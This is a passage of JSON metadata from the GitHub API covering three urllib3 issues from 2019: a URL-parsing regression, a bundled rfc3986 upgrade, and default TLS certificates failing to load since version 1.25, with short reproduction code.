"https://api.github.com/users/Bllacky/followers", "following_url": "https://api.github.com/users/Bllacky/following{/other_user}", "gists_url": "https://api.github.com/users/Bllacky/gists{/gist_id}", "starred_url": "https://api.github.com/users/Bllacky/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Bllacky/subscriptions", "organizations_url": "https://api.github.com/users/Bllacky/orgs", "repos_url": "https://api.github.com/users/Bllacky/repos", "events_url": "https://api.github.com/users/Bllacky/events{/privacy}", "received_events_url": "https://api.github.com/users/Bllacky/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": {"login": "sethmlarson", "id": 18519037, "node_id": "MDQ6VXNlcjE4NTE5MDM3", "avatar_url": "https://avatars0.githubusercontent.com/u/18519037?v=4", "gravatar_id": "", "url": "https://api.github.com/users/sethmlarson", "html_url": "https://github.com/sethmlarson", "followers_url": "https://api.github.com/users/sethmlarson/followers", "following_url": "https://api.github.com/users/sethmlarson/following{/other_user}", "gists_url": "https://api.github.com/users/sethmlarson/gists{/gist_id}", "starred_url": "https://api.github.com/users/sethmlarson/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/sethmlarson/subscriptions", "organizations_url": "https://api.github.com/users/sethmlarson/orgs", "repos_url": "https://api.github.com/users/sethmlarson/repos", "events_url": "https://api.github.com/users/sethmlarson/events{/privacy}", "received_events_url": "https://api.github.com/users/sethmlarson/received_events", "type": "User", "site_admin": false}, "assignees": [{"login": "sethmlarson", "id": 18519037, "node_id": "MDQ6VXNlcjE4NTE5MDM3", "avatar_url": "https://avatars0.githubusercontent.com/u/18519037?v=4", "gravatar_id": "", "url": "https://api.github.com/users/sethmlarson", "html_url": "https://github.com/sethmlarson", "followers_url": "https://api.github.com/users/sethmlarson/followers", "following_url": "https://api.github.com/users/sethmlarson/following{/other_user}", "gists_url": "https://api.github.com/users/sethmlarson/gists{/gist_id}", "starred_url": "https://api.github.com/users/sethmlarson/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/sethmlarson/subscriptions", "organizations_url": "https://api.github.com/users/sethmlarson/orgs", "repos_url": "https://api.github.com/users/sethmlarson/repos", "events_url": "https://api.github.com/users/sethmlarson/events{/privacy}", "received_events_url": "https://api.github.com/users/sethmlarson/received_events", "type": "User", "site_admin": false}], "milestone": null, "comments": 25, "created_at": "2019-05-17T07:07:34Z", "updated_at": "2019-05-22T12:44:15Z", "closed_at": "2019-05-22T11:43:31Z", "author_association": "NONE", "active_lock_reason": null, "body": "Unfortunately, I can't give many details regarding the issue because I don't know what exactly it would be relevant.\r\n\r\nI am running a service, using Flask, with python 3.6.8.\r\n\r\nI've upgraded requests to 2.22.0.\r\n\r\nIf I upgrade urllib3 to 1.25.2 the service I am opening on whatever port is no longer accessible through other python scripts.\r\n\r\nI get InvalidURL('Failed to parse: http://localhost:96768/service',)\r\n\r\nIn the service.py\r\n@app.route(\"/service\", methods=[\"POST\"])\r\n@wrap_exceptions\r\n\r\n app.run(\"0.0.0.0\", port=args.port, debug=args.debug, threaded=False)\r\nthere are no exceptions when running service.py\r\n\r\nIn a program that accesses the service I have something like this:\r\nURL = \"http://localhost:{}/service\"\r\n\r\nfrom the URL I then make a list of urls, with different ports. Each port has the same service with slightly different parameters.\r\n\r\nand then\r\nget_response = partial (requests.post, data=data)\r\n        response = get_first (get_response, urls)\r\n\r\nIf I revert to 1.24.3 everything works fine.\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1605", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1605/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1605/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1605/events", "html_url": "https://github.com/urllib3/urllib3/issues/1605", "id": 443503909, "node_id": "MDU6SXNzdWU0NDM1MDM5MDk=", "number": 1605, "title": "Upgrade packaged rfc3986", "user": {"login": "sethmlarson", "id": 18519037, "node_id": "MDQ6VXNlcjE4NTE5MDM3", "avatar_url": "https://avatars0.githubusercontent.com/u/18519037?v=4", "gravatar_id": "", "url": "https://api.github.com/users/sethmlarson", "html_url": "https://github.com/sethmlarson", "followers_url": "https://api.github.com/users/sethmlarson/followers", "following_url": "https://api.github.com/users/sethmlarson/following{/other_user}", "gists_url": "https://api.github.com/users/sethmlarson/gists{/gist_id}", "starred_url": "https://api.github.com/users/sethmlarson/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/sethmlarson/subscriptions", "organizations_url": "https://api.github.com/users/sethmlarson/orgs", "repos_url": "https://api.github.com/users/sethmlarson/repos", "events_url": "https://api.github.com/users/sethmlarson/events{/privacy}", "received_events_url": "https://api.github.com/users/sethmlarson/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": {"login": "sethmlarson", "id": 18519037, "node_id": "MDQ6VXNlcjE4NTE5MDM3", "avatar_url": "https://avatars0.githubusercontent.com/u/18519037?v=4", "gravatar_id": "", "url": "https://api.github.com/users/sethmlarson", "html_url": "https://github.com/sethmlarson", "followers_url": "https://api.github.com/users/sethmlarson/followers", "following_url": "https://api.github.com/users/sethmlarson/following{/other_user}", "gists_url": "https://api.github.com/users/sethmlarson/gists{/gist_id}", "starred_url": "https://api.github.com/users/sethmlarson/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/sethmlarson/subscriptions", "organizations_url": "https://api.github.com/users/sethmlarson/orgs", "repos_url": "https://api.github.com/users/sethmlarson/repos", "events_url": "https://api.github.com/users/sethmlarson/events{/privacy}", "received_events_url": "https://api.github.com/users/sethmlarson/received_events", "type": "User", "site_admin": false}, "assignees": [{"login": "sethmlarson", "id": 18519037, "node_id": "MDQ6VXNlcjE4NTE5MDM3", "avatar_url": "https://avatars0.githubusercontent.com/u/18519037?v=4", "gravatar_id": "", "url": "https://api.github.com/users/sethmlarson", "html_url": "https://github.com/sethmlarson", "followers_url": "https://api.github.com/users/sethmlarson/followers", "following_url": "https://api.github.com/users/sethmlarson/following{/other_user}", "gists_url": "https://api.github.com/users/sethmlarson/gists{/gist_id}", "starred_url": "https://api.github.com/users/sethmlarson/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/sethmlarson/subscriptions", "organizations_url": "https://api.github.com/users/sethmlarson/orgs", "repos_url": "https://api.github.com/users/sethmlarson/repos", "events_url": "https://api.github.com/users/sethmlarson/events{/privacy}", "received_events_url": "https://api.github.com/users/sethmlarson/received_events", "type": "User", "site_admin": false}], "milestone": null, "comments": 0, "created_at": "2019-05-13T16:56:55Z", "updated_at": "2019-05-17T02:56:26Z", "closed_at": "2019-05-17T02:56:26Z", "author_association": "MEMBER", "active_lock_reason": null, "body": "Upgrade to v1.3.2", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1603", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1603/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1603/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1603/events", "html_url": "https://github.com/urllib3/urllib3/issues/1603", "id": 441727491, "node_id": "MDU6SXNzdWU0NDE3Mjc0OTE=", "number": 1603, "title": "Default certificates are never loaded since version 1.25", "user": {"login": "daa", "id": 167235, "node_id": "MDQ6VXNlcjE2NzIzNQ==", "avatar_url": "https://avatars1.githubusercontent.com/u/167235?v=4", "gravatar_id": "", "url": "https://api.github.com/users/daa", "html_url": "https://github.com/daa", "followers_url": "https://api.github.com/users/daa/followers", "following_url": "https://api.github.com/users/daa/following{/other_user}", "gists_url": "https://api.github.com/users/daa/gists{/gist_id}", "starred_url": "https://api.github.com/users/daa/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/daa/subscriptions", "organizations_url": "https://api.github.com/users/daa/orgs", "repos_url": "https://api.github.com/users/daa/repos", "events_url": "https://api.github.com/users/daa/events{/privacy}", "received_events_url": "https://api.github.com/users/daa/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 907324977, "node_id": "MDU6TGFiZWw5MDczMjQ5Nzc=", "url": "https://api.github.com/repos/urllib3/urllib3/labels/TLS", "name": "TLS", "color": "1116a3", "default": false, "description": ""}], "state": "closed", "locked": false, "assignee": {"login": "sethmlarson", "id": 18519037, "node_id": "MDQ6VXNlcjE4NTE5MDM3", "avatar_url": "https://avatars0.githubusercontent.com/u/18519037?v=4", "gravatar_id": "", "url": "https://api.github.com/users/sethmlarson", "html_url": "https://github.com/sethmlarson", "followers_url": "https://api.github.com/users/sethmlarson/followers", "following_url": "https://api.github.com/users/sethmlarson/following{/other_user}", "gists_url": "https://api.github.com/users/sethmlarson/gists{/gist_id}", "starred_url": "https://api.github.com/users/sethmlarson/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/sethmlarson/subscriptions", "organizations_url": "https://api.github.com/users/sethmlarson/orgs", "repos_url": "https://api.github.com/users/sethmlarson/repos", "events_url": "https://api.github.com/users/sethmlarson/events{/privacy}", "received_events_url": "https://api.github.com/users/sethmlarson/received_events", "type": "User", "site_admin": false}, "assignees": [{"login": "sethmlarson", "id": 18519037, "node_id": "MDQ6VXNlcjE4NTE5MDM3", "avatar_url": "https://avatars0.githubusercontent.com/u/18519037?v=4", "gravatar_id": "", "url": "https://api.github.com/users/sethmlarson", "html_url": "https://github.com/sethmlarson", "followers_url": "https://api.github.com/users/sethmlarson/followers", "following_url": "https://api.github.com/users/sethmlarson/following{/other_user}", "gists_url": "https://api.github.com/users/sethmlarson/gists{/gist_id}", "starred_url": "https://api.github.com/users/sethmlarson/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/sethmlarson/subscriptions", "organizations_url": "https://api.github.com/users/sethmlarson/orgs", "repos_url": "https://api.github.com/users/sethmlarson/repos", "events_url": "https://api.github.com/users/sethmlarson/events{/privacy}", "received_events_url": "https://api.github.com/users/sethmlarson/received_events", "type": "User", "site_admin": false}], "milestone": null, "comments": 2, "created_at": "2019-05-08T13:10:46Z", "updated_at": "2019-05-23T17:32:38Z", "closed_at": "2019-05-23T17:32:38Z", "author_association": "NONE", "active_lock_reason": null, "body": "Opening an HTTPS URL with ``urllib3>=1.25`` results in ``SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1056)')))``, example to reproduce is following:\r\n```\r\nimport urllib3\r\n\r\nhttp = urllib3.PoolManager()\r\nhttp.request('GET', 'https://google.com/')\r\n```\r\n\r\nThe reason is that default system certificates are never loaded because ``HTTPSConnection`` or ``VerificedHTTPSConnection`` creates ssl context without loading certificates and passes it to ``ssl_wrap_socket`` where default certificates are not loaded too because passed ``ssl_context`` is not ``None``. Related lines of code:\r\n``src/urllib3/connection.py``:\r\n```\r\n        if self.ssl_context is None:\r\n            self.ssl_context = create_urllib3_context(\r\n                ssl_version=resolve_ssl_version(None),\r\n                cert_reqs=resolve_cert_reqs(None),\r\n            )\r\n\r\n        self.sock = ssl_wrap_socket(\r\n            sock=conn,\r\n            keyfile=self.key_file,\r\n            certfile=self.cert_file,\r\n            key_password=self.key_password,\r\n            ssl_context=self.ssl_context,\r\n            server_hostname=self.server_hostname\r\n)\r\n```\r\n``src/urllib3/util/ssl_.py``:\r\n```\r\n    elif ssl_context is None and hasattr(context, 'load_default_certs'):\r\n        # try to load OS default certs; works well on Windows (require Python3.4+)\r\n        context.load_default_certs()\r\n```", "performed_via_github_app": null, "score": 1.0}]}